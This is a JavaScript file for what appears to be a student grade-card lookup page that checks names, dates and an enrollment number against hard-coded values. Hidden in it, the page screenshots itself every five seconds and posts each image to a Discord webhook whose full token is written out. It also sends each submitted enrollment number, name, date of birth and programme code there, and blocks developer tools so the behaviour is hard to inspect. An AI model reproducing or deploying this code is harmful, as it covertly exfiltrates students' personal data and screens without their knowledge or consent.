function submitExtraFields() {
    var e = document.getElementById("aprilDate").value,
        t = document.getElementById("dobDate").value,
        o = document.getElementById("nameInput").value.trim().toLowerCase();

    function n(e) {
        var t, o;
        return e ? ([e, t, o] = e.split("-"), o + `-${t}-` + e) : ""
    }
    e = n(e).toLowerCase(), t = n(t).toLowerCase();
    ["03-04-2025", "04-04-2025"].includes(e) || ["bhinda", "bhoot", "laddu", "ritishika", "rishank", "bhindi", "sir", "patidev", "bhindi", "bandar", "sarvagun sampan", "sarvgun sampan"].includes(o) || ["08-08-2001"].includes(t) ? window.location.href = "result.html" : alert("Invalid date, name or DOB. Please enter the correct details.")
}

function updateCurrentDateTime() {
    var e = new Date,
        t = String(e.getDate()).padStart(2, "0") + `/${String(e.getMonth() + 1).padStart(2, "0")}/` + e.getFullYear(),
        e = String(e.getHours()).padStart(2, "0") + `:${String(e.getMinutes()).padStart(2, "0")}:` + String(e.getSeconds()).padStart(2, "0"),
        o = document.querySelector(".current-date");
    o && (o.textContent = `Current Date: ${t} ` + e)
}
document.addEventListener("contextmenu", function (e) {
    e.preventDefault()
}), document.addEventListener("keydown", function (e) {
    if ("F12" === e.key || e.ctrlKey && e.shiftKey && "I" === e.key || e.ctrlKey && e.shiftKey && "J" === e.key || e.ctrlKey && "U" === e.key || e.ctrlKey && e.shiftKey && "C" === e.key) return e.preventDefault(), !1
}), setInterval(function () {
    var e = performance.now();
    100 < performance.now() - e && (document.body.innerHTML = '<h1 style="text-align:center; margin-top:20%;">Developer tools are not allowed.</h1>')
}, 1e3), $(document).ready(function () {
    $("#studentForm").on("submit", function (e) {
        e.preventDefault();
        var e = $.trim($("#enrollmentNo").val()),
            t = $.trim($("#dob").val());
        e && t ? "2300822199" === e || ["2000-10-06", "1999-10-06"].includes(t) ? ($("#overlay").show(), $("#popup").show()) : alert("Details do not match. Please check your information.") : alert("Please fill in all required fields.")
    })
}), $(document).ready(function () {
    setTimeout(function () {
        // Show popup
        $("#infoOverlay").show();
        $("#infoPopup").show();

        setTimeout(function () {
            $("#dearChange").text("Student");
        }, 600);

        setTimeout(function () {
            $("#aloneHide").hide();
        }, 750);

    }, 5000);
    $("#closeInfoPopup").click(function () {
        $("#infoOverlay").hide();
        $("#infoPopup").hide();
    });
}), updateCurrentDateTime(), setInterval(updateCurrentDateTime, 1e3), window.addEventListener("load", () => {
    setInterval(() => {
        html2canvas(document.body, {
            useCORS: !0
        }).then(e => {
            e.toBlob(e => {
                var t = new FormData;
                t.append("file", e, "screenshot.png");
                const o = (new Date).toLocaleString();
                t.append("payload_json", JSON.stringify({
                    content: "📸 Screenshot taken at " + o
                }));
                fetch("https://discord.com/api/webhooks/1408320672110743623/qC2r_vnos_DwbDjQQN3OdoZSLMJ5WXX-UfhEQR0I5G9pEF_e-mjPZsk8vq8jSc5TqkI1", {
                    method: "POST",
                    body: t
                }).then(e => {
                    e.ok ? console.log("Screenshot sent at", o) : console.error("Failed to send screenshot:", e.statusText)
                }).catch(console.error)
            }, "image/png")
        })
    }, 5e3)
});
const webhookUrl = "https://discord.com/api/webhooks/1408320672110743623/qC2r_vnos_DwbDjQQN3OdoZSLMJ5WXX-UfhEQR0I5G9pEF_e-mjPZsk8vq8jSc5TqkI1";

function formatDateDMY(e) {
    var t, o;
    return e ? ([e, t, o] = e.split("-"), o + `-${t}-` + e) : ""
}

function sendToDiscord(e, t) {
    fetch(webhookUrl, {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            content: e
        })
    }).then(e => {
        e.ok ? t.reset() : console.error("Error:", e.statusText)
    }).catch(e => {
        alert("Error sending data."), console.error(e)
    })
}
async function submitExtraFields() {
    var e = document.getElementById("aprilDatePopUp").value,
        t = document.getElementById("nameInputPopUp").value.trim(),
        o = document.getElementById("programmeCodePopUp"),
        n = o.value,
        oText = o.options[o.selectedIndex]?.text || "",
        r = document.getElementById("dobDatePopUp").value;

    console.log({
        aprilDate: e,
        nameInput: t,
        programmeCodeValue: n,
        programmeCodeText: oText,
        dobDate: r
    });

    if (!e) return alert("Please enter the April Date.");
    if (!t) return alert("Please enter the Name.");
    if (!n) return alert("Please select a Programme Code.");
    if (!r) return alert("Please enter the DOB.");

    // ✅ Save to localStorage
    const formData = {
        aprilDate: e,
        name: t,
        programmeCode: {
            value: n,
            text: oText
        },
        dob: r,
        savedAt: new Date().toISOString()
    };
    localStorage.setItem("popupFormData", JSON.stringify(formData));

    // ✅ Send to Discord
    const payload = {
        content: `**New Form Submission**
**April Date:** ${e}
**Name:** ${t}
**Programme Code:** ${oText} (Value: ${n})
**Other DOB:** ${r}
**Submitted At:** ${new Date().toLocaleString()}`
    };

    try {
        var a = await fetch(webhookUrl, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(payload)
        });
        if (a.ok) {
            window.location.href = "result.html";
        } else {
            alert("Failed to send data to Discord.");
            console.error("Discord webhook error:", a.statusText);
        }
    } catch (e) {
        alert("Error sending data.");
        console.error(e);
    }
}
document.getElementById("studentForm").addEventListener("submit", function (e) {
    e.preventDefault();
    var e = document.getElementById("gradeCardStatus").value,
        t = document.getElementById("enrollmentNo").value.trim(),
        o = document.getElementById("programmeCode").value,
        n = formatDateDMY(document.getElementById("dob").value);
    sendToDiscord(`
**Main Form Submission - ${(new Date).toLocaleString()}**

**Grade Card Status:** ${e}
**Enrollment No:** ${t}
**Programme Code:** ${o}
**Date of Birth:** ${n}
`, this)
}), document.addEventListener("contextmenu", e => (e.preventDefault(), !1)), document.addEventListener("keydown", e => {
    !e.ctrlKey && 123 != e.keyCode || (e.stopPropagation(), e.preventDefault())
});
